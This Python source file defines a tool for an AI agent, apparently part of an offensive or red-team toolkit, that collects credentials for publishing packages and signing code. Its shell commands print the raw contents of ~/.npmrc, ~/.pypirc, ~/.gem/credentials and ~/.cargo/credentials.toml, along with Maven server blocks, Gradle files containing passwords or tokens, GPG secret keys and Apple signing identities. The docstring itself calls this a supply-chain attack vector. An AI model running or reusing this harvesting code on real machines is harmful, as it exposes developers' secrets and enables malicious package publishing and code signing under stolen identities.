"""Package registry and code-signing credential discovery.

An attacker with these credentials could publish malicious packages to public
or private registries, sign code with a trusted identity, or push container
images — a classic software supply chain attack vector.
"""

from __future__ import annotations

from langchain_core.tools import tool

from ..base import run_command


@tool
def find_publishing_credentials() -> str:
    """Find credentials that could be used to publish packages or sign code.

    Checks for:
    - npm / pnpm / yarn registry tokens (~/.npmrc, authenticated sessions)
    - PyPI upload credentials (~/.pypirc, ~/.config/pypi/)
    - Docker registry auth tokens (~/.docker/config.json)
    - RubyGems push credentials (~/.gem/credentials)
    - Cargo / crates.io publish tokens (~/.cargo/credentials.toml)
    - Maven / Gradle repository credentials (~/.m2/settings.xml, ~/.gradle/)
    - Apple code-signing certificates (Keychain) and provisioning profiles
    - GPG signing keys (git commit/tag signing, package signing)
    - Homebrew tap repositories the user could push to

    Returns:
        Summary of publishing credentials and signing identities found.
    """
    sections = []

    # ── npm / pnpm / yarn ─────────────────────────────────────────────────────
    npmrc = run_command(
        "cat ~/.npmrc 2>/dev/null | grep -v '^#' | grep -v '^$'", timeout=5
    )
    sections.append(
        f"=== npm credentials (~/.npmrc) ===\n"
        + (npmrc.stdout.strip() or "(not found)")
    )

    npm_whoami = run_command("npm whoami 2>&1", timeout=10)
    sections.append(
        f"=== npm logged-in user ===\n{npm_whoami.output.strip() or '(not logged in or npm not installed)'}"
    )

    # pnpm and yarn share ~/.npmrc or have their own token stores
    yarn_token = run_command(
        "cat ~/.yarnrc.yml 2>/dev/null | grep npmAuthToken", timeout=5
    )
    if yarn_token.stdout.strip():
        sections.append(f"=== yarn registry token (~/.yarnrc.yml) ===\n{yarn_token.stdout.strip()}")

    # ── PyPI ──────────────────────────────────────────────────────────────────
    pypirc = run_command("cat ~/.pypirc 2>/dev/null", timeout=5)
    sections.append(
        f"=== PyPI credentials (~/.pypirc) ===\n"
        + (pypirc.stdout.strip() or "(not found)")
    )

    pypi_cfg = run_command("cat ~/.config/pypi/pypi.cfg 2>/dev/null", timeout=5)
    if pypi_cfg.stdout.strip():
        sections.append(f"=== PyPI config (~/.config/pypi/) ===\n{pypi_cfg.stdout.strip()}")

    # ── Docker registry auth ──────────────────────────────────────────────────
    # Show registry hostnames only — not the raw base64-encoded tokens
    docker_auths = run_command(
        "python3 -c \""
        "import json, sys;"
        "d=json.load(open('$(echo ~/.docker/config.json)'));"
        "auths=list(d.get('auths',{}).keys());"
        "helpers=list(d.get('credHelpers',{}).keys());"
        "print('Authed registries:', auths);"
        "print('Cred helpers:', helpers)"
        "\" 2>/dev/null",
        timeout=5,
    )
    # Simpler approach that doesn't require Python expansion in shell
    docker_auths = run_command(
        "cat ~/.docker/config.json 2>/dev/null"
        " | python3 -c \""
        "import json,sys;"
        "d=json.load(sys.stdin);"
        "print('Authed registries:', list(d.get('auths',{}).keys()));"
        "print('Cred helpers:', list(d.get('credHelpers',{}).keys()))"
        "\" 2>/dev/null",
        timeout=5,
    )
    sections.append(
        f"=== Docker registry credentials ===\n"
        + (docker_auths.stdout.strip() or "(~/.docker/config.json not found or no auths)")
    )

    docker_whoami = run_command("docker info --format '{{.Username}}' 2>/dev/null", timeout=8)
    if docker_whoami.stdout.strip():
        sections.append(f"=== Docker Hub logged-in user ===\n{docker_whoami.stdout.strip()}")

    # ── RubyGems ──────────────────────────────────────────────────────────────
    gem_creds = run_command(
        "cat ~/.gem/credentials 2>/dev/null | head -5", timeout=5
    )
    sections.append(
        f"=== RubyGems push credentials (~/.gem/credentials) ===\n"
        + (gem_creds.stdout.strip() or "(not found)")
    )

    # ── Cargo / crates.io ─────────────────────────────────────────────────────
    cargo_creds = run_command(
        "cat ~/.cargo/credentials.toml 2>/dev/null || cat ~/.cargo/credentials 2>/dev/null | head -5",
        timeout=5,
    )
    sections.append(
        f"=== Cargo / crates.io credentials ===\n"
        + (cargo_creds.stdout.strip() or "(not found)")
    )

    # ── Maven / Gradle ────────────────────────────────────────────────────────
    maven = run_command(
        "cat ~/.m2/settings.xml 2>/dev/null | grep -A5 '<server>'", timeout=5
    )
    if maven.stdout.strip():
        sections.append(f"=== Maven repository credentials (~/.m2/settings.xml) ===\n{maven.stdout.strip()}")

    gradle = run_command(
        "find ~/.gradle -name '*.properties' 2>/dev/null | head -5 | xargs grep -l 'password\\|token\\|api_key' 2>/dev/null",
        timeout=8,
    )
    if gradle.stdout.strip():
        sections.append(f"=== Gradle credential files ===\n{gradle.stdout.strip()}")

    # ── Apple code signing ────────────────────────────────────────────────────
    codesign = run_command(
        "security find-identity -v -p codesigning 2>/dev/null", timeout=10
    )
    sections.append(
        f"=== Apple code-signing certificates ===\n"
        + (codesign.stdout.strip() or "(none found)")
    )

    profiles = run_command(
        "ls ~/Library/MobileDevice/Provisioning\\ Profiles/ 2>/dev/null | wc -l | tr -d ' '",
        timeout=5,
    )
    pcount = profiles.stdout.strip()
    if pcount and pcount != "0":
        sections.append(f"=== Apple provisioning profiles ===\n{pcount} profile(s) installed")

    # ── GPG signing keys ──────────────────────────────────────────────────────
    gpg_keys = run_command(
        "gpg --list-secret-keys --keyid-format LONG 2>/dev/null", timeout=8
    )
    sections.append(
        f"=== GPG secret keys (commit/package signing) ===\n"
        + (gpg_keys.stdout.strip() or "(none found)")
    )

    # Check if git is configured to sign commits with one of these keys
    git_sign = run_command("git config --global commit.gpgsign 2>/dev/null").output.strip()
    git_sigkey = run_command("git config --global user.signingkey 2>/dev/null").output.strip()
    if git_sign or git_sigkey:
        sections.append(
            f"=== Git commit signing ===\ncommit.gpgsign: {git_sign or '(not set)'}\n"
            f"user.signingkey: {git_sigkey or '(not set)'}"
        )

    # ── Homebrew taps (could be push targets) ─────────────────────────────────
    taps = run_command("brew tap 2>/dev/null", timeout=10)
    if taps.stdout.strip():
        sections.append(
            f"=== Homebrew taps (check for push access via git remotes above) ===\n"
            + taps.stdout.strip()
        )

    return "\n\n".join(sections)
